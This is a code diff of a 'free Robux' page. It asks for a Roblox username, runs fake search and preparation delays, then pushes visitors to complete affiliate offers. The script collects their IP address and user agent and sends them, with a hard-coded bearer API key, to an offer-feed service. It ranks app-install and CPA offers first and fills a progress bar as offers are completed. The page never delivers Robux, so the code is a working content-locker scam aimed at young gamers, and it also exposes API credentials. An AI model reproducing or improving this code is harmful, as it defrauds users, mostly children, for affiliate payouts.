@@ -68,12 +68,15 @@
 
     /* Yellow Instruction Box */
     .instruction-box { margin-bottom: 20px; display: flex; align-items: center; text-align: left; background-color: #FFF9E6; border: 1px solid #FFE69C; padding: 20px; border-radius: 8px; }
-    .instruction-box-text { display: flex; flex-direction: column; width: 100%; }
     .instruction-box p { font-size: 15px; color: #856404; line-height: 1.4; font-weight: 700; margin: 0; }
 
     .offer-item { display: flex; align-items: center; justify-content: space-between; background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; margin-bottom: 12px; text-align: left; }
     .offer-item p { margin: 0; font-size: 14px; font-weight: 600; flex: 1; padding-right: 15px; color: #222; }
     .complete-btn { background: #00b06f; color: white; text-decoration: none; padding: 10px 18px; border-radius: 6px; font-weight: bold; font-size: 14px; }
+
+    /* Refresh Button Styling */
+    .refresh-offer-btn { width: 100%; background: #1446FF; color: #fff; padding: 12px; border-radius: 8px; border: none; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+    .refresh-offer-btn:disabled { background: #bdbebe; cursor: not-allowed; }
 
     .footer { font-size: 13px; color: #777; margin-top: 20px; font-weight: 600; padding-top: 15px; border-top: 1px solid #eee; }
     
@@ -100,8 +103,8 @@
   <div class="box_con">
     <div class="box">
       <h3>Roblox Username</h3><br>
-      <input class="username" type="text" placeholder="Enter Username"><br>
-      <button class="getrbx">Claim Robux</button>
+      <input class="username" type="text" placeholder="Enter Username" id="userIn"><br>
+      <button class="getrbx" id="claimBtn">Claim Robux</button>
     </div>
 
     <div class="box2">
@@ -113,22 +116,10 @@
     
     <div class="box3">
       <div class="container">
-        <div class="row">
-          <div class="price-col"><s>$9.99</s> <span class="free-label">Free</span></div>
-          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>880</span></div>
-        </div>
-        <div class="row">
-          <div class="price-col"><s>$19.99</s> <span class="free-label">Free</span></div>
-          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>1,870</span></div>
-        </div>
-        <div class="row">
-          <div class="price-col"><s>$49.99</s> <span class="free-label">Free</span></div>
-          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>4,950</span></div>
-        </div>
-        <div class="row">
-          <div class="price-col"><s>$99.99</s> <span class="free-label">Free</span></div>
-          <div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>11,000</span></div>
-        </div>
+        <div class="row"><div class="price-col"><s>$9.99</s> <span class="free-label">Free</span></div><div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>880</span></div></div>
+        <div class="row"><div class="price-col"><s>$19.99</s> <span class="free-label">Free</span></div><div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>1,870</span></div></div>
+        <div class="row"><div class="price-col"><s>$49.99</s> <span class="free-label">Free</span></div><div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>4,950</span></div></div>
+        <div class="row"><div class="price-col"><s>$99.99</s> <span class="free-label">Free</span></div><div class="details"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg"><span>11,000</span></div></div>
       </div>
     </div>
 
@@ -148,9 +139,7 @@
         
         <div class="content">
             <div class="instruction-box">
-                <div class="instruction-box-text">
-                    <p>Choose an offer below and Click it. Follow each step of the offer carefully. Once you finish the offer and see ‘Offer Completed’, your Robux will be sent immediately.</p>
-                </div>
+                <p>Choose an offer below and Click it. Follow each step carefully. Once finished, your Robux will be sent immediately.</p>
             </div>
 
             <div class="progress-wrapper">
@@ -160,6 +149,7 @@
 
             <div id="offer_holder"></div>
             
+            <button class="refresh-offer-btn" id="refreshBtn">Refresh Offers (<span id="count">3</span> left)</button>
             <div class="footer">Waiting for completion...</div>
         </div>
     </div>
@@ -167,67 +157,76 @@
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script>
-    let currentProgress = 0;
-    let completedCount = 0;
-    let username = "";
-    let checkInterval;
+    // --- SOUND ASSETS ---
+    const sType = new Audio('https://www.soundjay.com/communication/sounds/typewriter-key-1.mp3');
+    const sBtn = new Audio('https://www.soundjay.com/buttons/sounds/button-16.mp3');
+    const sWin = new Audio('https://www.soundjay.com/buttons/sounds/button-09.mp3');
+    const sTf = new Audio('https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3');
 
-    $('.getrbx').click(function() {
-        username = $('.username').val();
+    $('#userIn').on('input', function() { sType.currentTime = 0; sType.play(); });
+
+    let currentProgress = 0, username = "", refreshCount = 3, checkInterval;
+
+    $('#claimBtn').click(function() {
+        sBtn.play();
+        username = $('#userIn').val();
         if (username.length <= 2) return alert('Enter a valid username');
-        $('.box').hide(); 
-        $('.box2').show().find('.useroutput').html('Searching for <b>' + username + '</b>...');
-        setTimeout(() => { $('.box2').hide(); $('.box3').show(); }, 2000);
+        $('.box').hide(); $('.box2').show().find('.useroutput').html('Searching for <b>' + username + '</b>...');
+        setTimeout(() => { sTf.play(); $('.box2').hide(); $('.box3').show(); }, 2000);
     });
 
     $(document).on('click', '.details', function() {
-        $('.box3').hide(); 
-        $('.box2').show().find('.useroutput').html('Preparing package for <b>' + username + '</b>...');
-        setTimeout(() => { $('.box2').hide(); $('.box4').show(); }, 2000);
+        sBtn.play();
+        $('.box3').hide(); $('.box2').show().find('.useroutput').html('Preparing package for <b>' + username + '</b>...');
+        setTimeout(() => { sTf.play(); $('.box2').hide(); $('.box4').show(); }, 2000);
     });
 
-    // UPDATED LOGIC: Sorts all regional offers by payout (Highest to Lowest)
+    // Priority Sort: CPI (1) > CPA (2) > PIN (4) then by Payout descending
     function loadOffers() {
         $("#offer_holder").html('Loading...');
-        const userID = "2421989";
-        const pubKey = "55055efce909f3b3ae2b679b223a1431";
+        const apiKey = "37909|gvBknOfylyIKWqw1hUAIDMj2cOZqriUiKPjX5T0Xee233a23";
+        const endpoint = "https://lockedapp.store/api/v2";
 
         $.getJSON("https://api.ipify.org?format=json", function(ipData) {
-            // Fetch 50 offers to find the absolute best payouts in the region
-            const apiURL = `https://www.cpagrip.com/common/offer_feed_json.php?user_id=${userID}&pubkey=${pubKey}&ip=${ipData.ip}&ua=${encodeURIComponent(navigator.userAgent)}&tracking_id=${username}&limit=50`;
-            
-            $.getJSON(apiURL, function(data) {
-                if(!data.offers || data.offers.length === 0) {
-                    $("#offer_holder").html("<p style='color:red; padding: 20px;'>No offers found for your region. Try again later.</p>");
-                    return;
+            const apiURL = `${endpoint}?ip=${ipData.ip}&user_agent=${encodeURIComponent(navigator.userAgent)}&max=30`;
+
+            $.ajax({
+                url: apiURL,
+                headers: { "Authorization": `Bearer ${apiKey}` },
+                method: "GET",
+                dataType: "json",
+                success: function(data) {
+                    if(!data.offers || data.offers.length === 0) {
+                        $("#offer_holder").html("<p style='color:red;'>No offers found.</p>");
+                        return;
+                    }
+
+                    let sorted = data.offers.sort((a, b) => {
+                        const typeMap = { "1": 1, "2": 2, "4": 3 };
+                        let orderA = typeMap[a.ctype] || 99, orderB = typeMap[b.ctype] || 99;
+                        if (orderA !== orderB) return orderA - orderB;
+                        return parseFloat(b.payout) - parseFloat(a.payout);
+                    });
+
+                    let html = '';
+                    $.each(sorted.slice(0, 5), function(i, o) {
+                        html += `<div class="offer-item"><p>${o.name}</p><a href="${o.link}" target="_blank" onclick="sBtn.play()" class="complete-btn">Complete</a></div>`;
+                    });
+                    $("#offer_holder").html(html);
                 }
-
-                // SORTING: Arranges the entire list from Highest $ to Lowest $
-                let sortedOffers = data.offers.sort(function(a, b) {
-                    return parseFloat(b.payout) - parseFloat(a.payout);
-                });
-
-                // Take the Top 5 results
-                let bestOffers = sortedOffers.slice(0, 5);
-
-                let html = '';
-                $.each(bestOffers, function(i, offer) {
-                    let link = offer.offerlink.replace('www.cpagrip.com', 'motifiles.com');
-                    html += `<div class="offer-item"><p>${offer.title}</p><a href="${link}" target="_blank" class="complete-btn">Complete</a></div>`;
-                });
-                
-                $("#offer_holder").html(html);
             });
         });
     }
 
-    function updateProgressBar(amount) {
-        currentProgress += amount;
-        if(currentProgress > 100) currentProgress = 100;
-        $('#p-fill').css('width', currentProgress + '%');
-        $('#p-percent').text(currentProgress);
-        if(currentProgress >= 100) clearInterval(checkInterval);
-    }
+    $('#refreshBtn').click(function() {
+        sBtn.play();
+        if(refreshCount > 0) {
+            refreshCount--;
+            $('#count').text(refreshCount);
+            loadOffers();
+            if(refreshCount === 0) $(this).prop('disabled', true).text('Refresh Limit Reached');
+        }
+    });
 
     function startAutoCheck() {
         if(checkInterval) clearInterval(checkInterval);
@@ -236,25 +235,29 @@
                 const res = await fetch(`check_status.php?tracking_id=${username}`);
                 const data = await res.json();
                 if (data.status === "completed") {
-                    completedCount++;
-                    let add = (completedCount === 1) ? 50 : Math.floor(Math.random() * 11) + 20;
-                    updateProgressBar(add);
+                    sWin.play();
+                    currentProgress += (currentProgress === 0) ? 50 : 25;
+                    if(currentProgress > 100) currentProgress = 100;
+                    $('#p-fill').css('width', currentProgress + '%');
+                    $('#p-percent').text(currentProgress);
+                    if(currentProgress >= 100) clearInterval(checkInterval);
                 }
             } catch (e) { }
         }, 5000);
     }
 
-    document.getElementById('finalVerifyBtn').addEventListener('click', () => {
-        document.getElementById('offersModal').style.display = 'block';
+    $('#finalVerifyBtn').click(function() {
+        sBtn.play();
+        $('#offersModal').show();
         loadOffers();
         startAutoCheck();
     });
 
-    document.getElementById('closeModal').addEventListener('click', () => {
-        document.getElementById('offersModal').style.display = 'none';
+    $('#closeModal').click(function() {
+        sBtn.play();
+        $('#offersModal').hide();
         clearInterval(checkInterval);
     });
   </script>
 </body>
-  </html>
-        
+          </html>
